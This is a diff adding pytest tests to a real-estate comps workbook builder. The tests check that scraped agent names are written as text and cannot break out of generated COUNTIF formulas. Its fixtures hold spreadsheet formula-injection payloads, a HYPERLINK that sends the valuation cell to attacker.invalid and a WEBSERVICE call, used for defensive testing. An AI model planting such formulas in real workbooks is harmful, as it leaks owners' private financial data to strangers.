@@ -369,3 +369,80 @@ def test_invalid_market_directory_is_rejected(tmp_path):
     (tmp_path / "market.toml").write_text("[market]\ndescription = 'no name'\n", encoding="utf-8")
     with pytest.raises((MarketInvalid, ValueError)):
         load_market_from_path(tmp_path)
+
+
+# ---------------------------------------------------------------------------
+# Fetched text must never become a formula
+# ---------------------------------------------------------------------------
+#
+# Every string on a comp sheet came off somebody else's web page, and openpyxl
+# types a value beginning with "=" as a formula. A listing naming its agent
+# `=HYPERLINK("http://x/?v="&Summary!B5,"Jane Roe")` produced a live link that
+# sends the owner's valuation to a stranger. It survives extraction (it is only
+# a string) and verification (which checks price and date, not names).
+
+POISON = '=HYPERLINK("http://attacker.invalid/?x="&Summary!B5,"Jane Roe")'
+
+
+def _poisoned_workbook(land_result, tmp_path):
+    from openpyxl import load_workbook
+
+    from recomps.pipeline.agents import analyze
+    from recomps.workbook.builder import build_workbook
+
+    for comp in land_result.sold[:3]:
+        comp.agent = POISON
+        comp.brokerage = '=WEBSERVICE("http://attacker.invalid/")'
+    land_result.agent_analysis = analyze(land_result.sold, denominator="lot_sqft")
+    path = tmp_path / "poisoned.xlsx"
+    build_workbook(land_result).save(path)
+    return load_workbook(path)
+
+
+def test_a_hostile_agent_name_is_written_as_text_not_a_formula(land_result, tmp_path):
+    wb = _poisoned_workbook(land_result, tmp_path)
+    sheet = wb["Sold Comps"]
+    agent_cells = [c for row in sheet.iter_rows() for c in row if c.value == POISON]
+    assert agent_cells, "the poisoned name should still be present, verbatim"
+    for cell in agent_cells:
+        assert cell.data_type == "s", f"{cell.coordinate} is a live formula"
+
+
+def test_a_hostile_name_cannot_escape_a_formula_we_build(land_result, tmp_path):
+    """The Agents sheet interpolates the name into COUNTIF's criterion. An
+    unescaped double quote closes the literal and the rest parses as syntax."""
+    wb = _poisoned_workbook(land_result, tmp_path)
+    for sheet in wb:
+        for row in sheet.iter_rows():
+            for cell in row:
+                if cell.data_type != "f" or not isinstance(cell.value, str):
+                    continue
+                # Everything the attacker supplied must sit inside a literal,
+                # so no reference of theirs survives outside the quotes.
+                outside = "".join(cell.value.split('"')[::2])
+                assert "Summary!B5" not in outside, (
+                    f"{sheet.title}!{cell.coordinate} references a cell the "
+                    f"fetched text chose: {cell.value}"
+                )
+
+
+def test_a_rate_needs_both_a_price_and_a_size(land_result, tmp_path):
+    """Guarding only the denominator left the missing-price case open, and one
+    #VALUE! poisons every aggregate over the column."""
+    from openpyxl import load_workbook
+
+    from recomps.workbook.builder import build_workbook
+
+    land_result.sold[1].sold_price = None
+    land_result.sold[2].final_list_price = None
+    path = tmp_path / "gaps.xlsx"
+    build_workbook(land_result).save(path)
+    sheet = load_workbook(path)["Sold Comps"]
+
+    formulas = [
+        c.value for row in sheet.iter_rows() for c in row
+        if isinstance(c.value, str) and c.value.startswith("=IF(AND(ISNUMBER")
+    ]
+    assert formulas, "rate and ratio formulas must guard both operands"
+    for formula in formulas:
+        assert formula.count("ISNUMBER") == 2, formula
